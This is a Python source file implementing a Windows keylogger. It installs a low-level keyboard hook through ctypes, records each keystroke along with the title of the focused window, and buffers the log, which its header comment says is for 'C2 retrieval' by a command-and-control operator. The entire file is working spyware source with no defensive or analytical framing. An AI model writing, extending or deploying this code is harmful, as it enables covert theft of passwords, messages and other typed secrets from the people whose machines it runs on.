# keylogger.py — Low-level keyboard hook via ctypes
# Captures keystrokes with active window context, buffered for C2 retrieval

import ctypes
import ctypes.wintypes
import threading
import time
from collections import deque

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

# ── Constants ──────────────────────────────────────────────────
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104

SPECIAL_KEYS = {
    0x08: "[BS]",    0x09: "[TAB]",   0x0D: "[ENTER]",  0x1B: "[ESC]",
    0x20: " ",       0x2E: "[DEL]",   0x25: "[LEFT]",   0x26: "[UP]",
    0x27: "[RIGHT]", 0x28: "[DOWN]",  0xA0: "[LSHIFT]", 0xA1: "[RSHIFT]",
    0xA2: "[LCTRL]", 0xA3: "[RCTRL]", 0xA4: "[LALT]",   0xA5: "[RALT]",
    0x14: "[CAPS]",  0x90: "[NUM]",   0x2C: "[PRTSC]",  0x5B: "[LWIN]",
    0x5C: "[RWIN]",
}

# Low-level keyboard input structure
class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", ctypes.wintypes.DWORD),
        ("scanCode", ctypes.wintypes.DWORD),
        ("flags", ctypes.wintypes.DWORD),
        ("time", ctypes.wintypes.DWORD),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong)),
    ]

HOOKPROC = ctypes.CFUNCTYPE(
    ctypes.c_long,
    ctypes.c_int,
    ctypes.wintypes.WPARAM,
    ctypes.wintypes.LPARAM,
)


class KeyLogger:
    """Keyboard hook that captures keystrokes with window context."""

    def __init__(self, max_buffer: int = 10000):
        self._buffer = deque(maxlen=max_buffer)
        self._running = False
        self._thread = None
        self._hook = None
        self._lock = threading.Lock()
        self._callback_ref = None  # prevent GC of the callback

    def _get_window_title(self) -> str:
        """Return the title of the currently focused window."""
        try:
            hwnd = user32.GetForegroundWindow()
            length = user32.GetWindowTextLengthW(hwnd)
            if length == 0:
                return "Desktop"
            buf = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(hwnd, buf, length + 1)
            return buf.value or "Desktop"
        except Exception:
            return "Unknown"

    def _hook_callback(self, nCode, wParam, lParam):
        """Low-level keyboard hook procedure."""
        if nCode >= 0 and wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
            kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
            vk = kb.vkCode
            window = self._get_window_title()

            if vk in SPECIAL_KEYS:
                key = SPECIAL_KEYS[vk]
            elif 0x30 <= vk <= 0x5A:
                # Printable A-Z, 0-9 — check shift & caps for casing
                key = chr(vk)
                shift_held = (
                    user32.GetAsyncKeyState(0xA0) & 0x8000 or
                    user32.GetAsyncKeyState(0xA1) & 0x8000
                )
                caps_on = user32.GetKeyState(0x14) & 0x0001
                if not (shift_held ^ caps_on):  # XOR for proper casing
                    key = key.lower()
            elif 0x60 <= vk <= 0x69:
                # Numpad 0-9
                key = str(vk - 0x60)
            elif vk == 0xBE:
                key = "."
            elif vk == 0xBC:
                key = ","
            elif vk == 0xBD:
                key = "-"
            elif vk == 0xBA:
                key = ";"
            elif vk == 0xBB:
                key = "="
            elif vk == 0xBF:
                key = "/"
            elif vk == 0xC0:
                key = "`"
            elif vk == 0xDB:
                key = "["
            elif vk == 0xDC:
                key = "\\"
            elif vk == 0xDD:
                key = "]"
            elif vk == 0xDE:
                key = "'"
            else:
                key = f"[0x{vk:02X}]"

            with self._lock:
                self._buffer.append({
                    "time": time.strftime("%H:%M:%S"),
                    "window": window,
                    "key": key,
                })

        return user32.CallNextHookEx(self._hook, nCode, wParam, lParam)

    def _run_hook(self):
        """Install the keyboard hook and pump messages until stopped."""
        self._callback_ref = HOOKPROC(self._hook_callback)
        self._hook = user32.SetWindowsHookExW(
            WH_KEYBOARD_LL,
            self._callback_ref,
            kernel32.GetModuleHandleW(None),
            0,
        )
        if not self._hook:
            self._running = False
            return

        msg = ctypes.wintypes.MSG()
        while self._running:
            if user32.PeekMessageW(ctypes.byref(msg), None, 0, 0, 1):
                user32.TranslateMessage(ctypes.byref(msg))
                user32.DispatchMessageW(ctypes.byref(msg))
            time.sleep(0.005)

        user32.UnhookWindowsHookEx(self._hook)
        self._hook = None

    def start(self) -> str:
        """Start the keylogger in a background thread."""
        if self._running:
            return "Keylogger already running"
        self._running = True
        self._thread = threading.Thread(target=self._run_hook, daemon=True)
        self._thread.start()
        return "Keylogger started"

    def stop(self) -> str:
        """Stop the keylogger and unhook."""
        if not self._running:
            return "Keylogger not running"
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
            self._thread = None
        return "Keylogger stopped"

    def dump(self) -> list:
        """Retrieve and clear all buffered keystrokes."""
        with self._lock:
            logs = list(self._buffer)
            self._buffer.clear()
        return logs
